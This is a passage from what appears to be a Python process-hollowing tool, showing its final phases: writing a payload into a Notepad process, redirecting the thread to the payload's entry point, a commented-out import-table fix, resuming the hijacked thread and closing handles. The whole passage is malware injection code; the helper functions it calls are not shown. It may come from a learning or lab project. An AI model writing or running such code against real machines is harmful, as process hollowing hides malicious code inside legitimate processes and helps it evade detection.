write_payload(hProcess, lpBaseAddress, payload)




# ------------------------------------------------------
hdr = "\n >>>>    Phase: Execution Redirection    <<<<\n"
print_hdr(hdr)

redirect_to_payload(hThread, payload_entry_point_va)


##### FIX IAT HERE #####
#
#with open(payload) as f:
#    pe_data = f.read()
#
#print(f"\n[+] Fixing Import Address Table:")
#fix_iat_for_hollowing(hProcess, lpBaseAddress, pe_data)




# ------------------------------------------------------
hdr = "\n >>>>    Phase: Execution    <<<<\n"
print_hdr(hdr)

# confirm execution of payload
pause(warning=True)

# resume execution of original thread/process
resume_orig_process(hThread, dwThreadId, dwProcessId)




# ------------------------------------------------------
hdr = "\n >>>>    Phase: Clean-up    <<<<\n"
print_hdr(hdr)

# close all handles
print()
close_handle(hThread, "Notepad Thread")
close_handle(hProcess, "Notepad Process")
